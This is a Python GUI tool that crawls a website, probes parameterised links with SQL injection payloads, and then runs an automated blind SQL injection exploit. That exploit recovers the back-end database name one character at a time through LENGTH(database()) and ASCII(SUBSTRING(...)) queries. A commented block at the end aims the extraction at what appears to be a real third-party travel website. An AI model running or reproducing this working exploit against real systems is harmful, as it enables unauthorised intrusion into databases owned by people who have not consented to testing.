from PySide6.QtCore import *
from PySide6.QtGui import *
from PySide6.QtWidgets import *
from PySide6.QtUiTools import *
from modules.crawler import *
from modules.error import *
from modules.blind import *
from modules.blind_exploit import *
from MRequest.request import *
from concurrent.futures import ThreadPoolExecutor
from qt_material import apply_stylesheet
import threading
class Test(QMainWindow):
    def __init__(self):
        super().__init__()
        self.main = QUiLoader().load('main.ui',self)
        self.main.tablelinks.setColumnWidth(0,800)
        self.main.tablelinks.setColumnWidth(1,500)
        self.main.tableVuln.setColumnWidth(0,320)
        self.main.tableVuln.setColumnWidth(1,320)
        self.main.tableVuln.setColumnWidth(2,320)
        self.main.tableVuln.setColumnWidth(3,330)
        self.main.btnscan.clicked.connect(self.Tgetall_links)
        self.main.show()
    def Tgetall_links(self):
        t =threading.Thread(target=self.getall_links)
        t.start()
    def getall_links(self):
        self.dem=0
        self.main.lb_total_requests.setText(str(self.dem))
        self.main.listscan.addItem("Web crawlers processing: ")
        url=self.main.lineurl.text()
        depth=self.main.linedepth.text()
        self.m=ThreadPoolExecutor().submit(crawler_links,url,int(depth)).result()
        self.main.tablelinks.setRowCount(len(self.m))
        self.vuln=[]
        row=0
        for i in self.m:
            if self.check_url(i):
                self.vuln.append(i)
            print(i)
            a=NRequests()
            print(a.header)
            self.main.listheader.addItem("User-Agent: "+str(a.header['User-Agent']))
            self.main.listheader.addItem("Referer: "+str(a.header['Referer']))
            a.sendGet(i)
            self.main.lb_total_requests.setText(str(self.dem))
            self.main.listscan.addItem(i)
            self.main.lb_total_link.setText(str(row+1))
            self.main.tablelinks.setItem(row,0,QTableWidgetItem(i))
            self.main.tablelinks.setItem(row,1,QTableWidgetItem(str(a.status())))
            row+=1
            self.dem+=1
        self.main.listscan.addItem("Finished Crawler")
        t=threading.Thread(target=self.scansqli)
        t.start()
    
    def check_url(self,url):
        try:
            url.index("=")
            return True
        except:
            return False
    def scansqli(self):
        self.linkvuln=''
        self.p=''
        self.main.listscan.addItem("Start scan SQL Injection: ")
        row=0
        for z in self.vuln:
            for i in payload():
                a = NRequests()
                a.sendGet(z+i)
                self.main.listheader.addItem("User-Agent: "+str(a.header['User-Agent']))
                self.main.listheader.addItem("Referer: "+str(a.header['Referer']))
                self.dem+=1
                self.main.lb_total_requests.setText(str(self.dem))
                for j in sig():
                    if j in a.source():
                        self.main.listscan.addItem("Vuln: "+z+i)
                        self.main.tableVuln.setRowCount(1+row)
                        self.main.tableVuln.setItem(row,0,QTableWidgetItem(z))
                        self.main.tableVuln.setItem(row,1,QTableWidgetItem(z[z.index('?'):]))
                        self.main.tableVuln.setItem(row,2,QTableWidgetItem(i))
                        self.main.tableVuln.setItem(row,3,QTableWidgetItem(j))
                        row+=1
                        break
        for i in self.vuln:
            self.main.listheader.addItem("User-Agent: "+str(a.header['User-Agent']))
            self.main.listheader.addItem("Referer: "+str(a.header['Referer']))
            t1=NRequests()
            t1.sendGet(i)
            self.dem+=1
            self.main.lb_total_requests.setText(str(self.dem))
            dic=payload_blind()
            for x,y in dic.items():
                t2=NRequests()
                t2.sendGet(i+x)
                t3=NRequests()
                t3.sendGet(i+y)
                self.dem+=2
                self.main.lb_total_requests.setText(str(self.dem))
                if ( len(t1.source())==len(t2.source()) ) and ( len(t3.source())!=len(t1.source()) ):
                    self.main.tableVuln.setRowCount(1+row)
                    self.main.listscan.addItem("Vuln: "+i+" Payload 1: "+x+" Payload 2: "+y)
                    self.main.tableVuln.setItem(row,0,QTableWidgetItem(i))
                    self.main.tableVuln.setItem(row,1,QTableWidgetItem(i[i.index('?'):]))
                    self.main.tableVuln.setItem(row,2,QTableWidgetItem("Payload 1: "+x+" Payload 2: "+y))
                    self.linkvuln=i
                    self.p=x[0:x.index("d")+1]
                    row+=1
        self.main.listscan.addItem("Finished scan SQL Injection")
        print(self.p)
        if self.linkvuln!="":
            gt = threading.Thread(target=self.get_char,args=(self.linkvuln,self.get_length(self.linkvuln)))
            gt.start()
        else:
            pass

    def get_length(self,url):
        a = NRequests()
        a.sendGet(url)
        len_source=len(a.source())
        dem=0
        while True:
            b=NRequests()
            #payload=" and LENGTH(user())={0}-- -".format(dem)
            payload = self.p + "  LENGTH(database())={0}-- -".format(dem)
            b.sendGet(url+payload)
            if len_source==len(b.source()):
                return dem
            dem+=1

    def get_char(self,url,total):
        self.s=['']*int(total+1)
        a = NRequests()
        a.sendGet(url)
        len_source=len(a.source())
        for i in range(1,total+1):
            t = threading.Thread(target=self.scan,args=(url,i,len_source,32,126))
            t.start()
        
    def scan(self,url,vt,total,t,p):
        mm=''
        m=(t+p)//2
        payload = self.p + "  ASCII(SUBSTRING(database(),{0},1))={1}-- -".format(vt,m)
        b=NRequests()
        b.sendGet(url+payload)
        if total==len(b.source()):
            self.s[vt-1]=chr(m)
            for i in self.s:
                mm+=i
                print(mm)
                self.main.lbdb.setText(mm)
            return m
        p2=self.p + " ascii(substring(database(),{0},1))>{1}--+-".format(vt,m)
        b2=NRequests()
        b2.sendGet(url+p2)
        if total==len(b2.source()):
            return self.scan(url,vt,total,m+1,p)
        else:
            return self.scan(url,vt,total,t,m-1)


         
app=QApplication()
apply_stylesheet(app,theme='dark_teal.xml')
frame=Test()
app.exec_()

'''
a=T()
d=a.get_length('http://www.nesiyaholidays.com/details.php?id=54')
print(d)
a.get_char('http://www.nesiyaholidays.com/details.php?id=54',d)
'''


